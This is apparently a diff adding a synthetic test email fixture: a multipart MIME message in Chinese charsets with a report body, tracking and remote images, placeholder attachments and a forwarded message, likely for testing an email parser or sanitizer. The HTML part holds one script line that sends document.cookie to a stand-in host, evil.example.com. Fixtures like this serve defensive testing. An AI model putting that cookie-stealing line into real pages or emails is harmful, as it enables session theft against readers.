@@ -1,0 +1,85 @@
+From: =?utf-8?b?5byg5Lyf?= <zhang.wei@example.cn>
+To: =?utf-8?b?6YeH6LSt6YOoIOeOi+iKsw==?= <procurement@example.cn>
+Subject: =?utf-8?b?44CQ5a2j5bqm5oql5ZGK44CRUTMg5ZCI5ZCM6ZmE5Lu2?=
+Message-ID:
+ <178953501793.382.13295653008281658923.multicharset@archive.example>
+Date: Thu, 10 Sep 2026 00:26:40 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============1076561841644573780=="
+
+--===============1076561841644573780==
+Content-Type: multipart/alternative;
+ boundary="===============8018918474628360750=="
+
+--===============8018918474628360750==
+Content-Type: text/plain; charset="gb2312"
+Content-Transfer-Encoding: 8bit
+
+本季度营收增长 12%，详情见附件。
+
+--===============8018918474628360750==
+MIME-Version: 1.0
+Content-Type: multipart/related;
+ boundary="===============0830362572291896965=="
+
+--===============0830362572291896965==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<!doctype html>
+<html><head><meta charset=3D"utf-8"><title>=E5=90=88=E5=90=8C</title></head>
+<body>
+<h1>=E5=AD=A3=E5=BA=A6=E6=8A=A5=E5=91=8A Q3</h1>
+<p>=E5=9B=BE=E7=89=87: <img src=3D"cid:logo-1@archive.example"></p>
+<p>=E8=BF=9C=E7=A8=8B=E5=9B=BE=E7=89=87: <img src=3D"https://img.example.com/=
+tracker.png?user=3D42"></p>
+<p><a href=3D"https://files.example.com/x.pdf">=E5=A4=96=E9=83=A8=E6=96=87=E4=
+=BB=B6</a></p>
+<p>=E6=A0=B7=E5=BC=8F: <span style=3D"background-image:url('//css.example.com=
+/bg.png')">x</span></p>
+<script>fetch('https://evil.example.com/steal?c=3D'+document.cookie)</script>
+</body></html>
+
+--===============0830362572291896965==
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Disposition: inline; filename="logo.gif"
+Content-ID: logo-1@archive.example
+MIME-Version: 1.0
+
+R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==
+
+--===============0830362572291896965==--
+
+--===============8018918474628360750==--
+
+--===============1076561841644573780==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename*=utf-8''%E5%AD%A3%E5%BA%A6%E5%90%88%E5%90%8C.pdf
+MIME-Version: 1.0
+
+JVBERi0xLjQgZmFrZSBwZGYgYnl0ZXMK
+
+--===============1076561841644573780==
+Content-Type: application/vnd.ms-excel
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename*=utf-8''%E6%95%B0%E6%8D%AE%E6%98%8E%E7%BB%86.xls
+
+0M8R4GZha2UteGxz
+--===============1076561841644573780==
+Content-Type: message/rfc822
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="forwarded.eml"
+MIME-Version: 1.0
+
+RnJvbTogYm9zc0BleGFtcGxlLmNuClRvOiB6aGFuZy53ZWlAZXhhbXBsZS5jbgpTdWJqZWN0OiA9
+P3V0Zi04P2I/NVk2ZjVhZUw2WUt1NUx1MjVxQ0g2YUtZPz0KTWVzc2FnZS1JRDogPGlubmVyLW1z
+Z0BleGFtcGxlLmNuPgpEYXRlOiBUdWUsIDA4IFNlcCAyMDI2IDIwOjQwOjAwICswMDAwCkNvbnRl
+bnQtVHlwZTogdGV4dC9wbGFpbjsgY2hhcnNldD0idXRmLTgiCkNvbnRlbnQtVHJhbnNmZXItRW5j
+b2Rpbmc6IDhiaXQKTUlNRS1WZXJzaW9uOiAxLjAKCui/meaYr+iiq+i9rOWPkeeahOWOn+S/oeat
+o+aWh+OAggo=
+
+--===============1076561841644573780==--
